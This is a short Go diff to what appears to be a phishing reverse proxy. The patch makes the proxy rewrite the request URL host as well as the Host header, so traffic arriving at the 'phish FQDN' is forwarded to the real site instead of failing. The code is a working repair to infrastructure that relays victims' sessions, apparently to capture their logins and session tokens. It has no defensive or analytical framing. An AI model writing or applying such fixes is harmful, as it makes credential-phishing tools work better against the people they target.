@@ -638,9 +638,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// replace "Host" header
+				// replace "Host" header (and URL.Host — goproxy dials URL.Host).
+				// Leaving URL.Host on the phish FQDN makes dry-runs dial 127.0.0.1:443
+				// via /etc/hosts and fail with "connection refused".
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
+					if req.URL != nil {
+						req.URL.Host = r_host
+					}
 				}
 
 				// fix origin
